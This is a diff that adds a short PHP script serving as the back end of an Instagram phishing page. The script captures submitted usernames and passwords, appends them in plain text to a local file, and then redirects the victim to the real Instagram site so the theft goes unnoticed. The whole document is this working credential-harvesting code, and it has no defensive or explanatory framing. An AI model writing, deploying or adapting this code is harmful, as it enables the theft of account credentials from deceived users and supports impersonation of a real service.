@@ -1,0 +1,14 @@
+?php
+// Capture login credentials
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Save to a text file
+$file = fopen("logins.txt", "a");
+fwrite($file, "Username: " . $username . " | Password: " . $password . "\n");
+fclose($file);
+
+// Redirect to the real Instagram login page
+header("Location: https://www.instagram.com");
+exit();
+?>
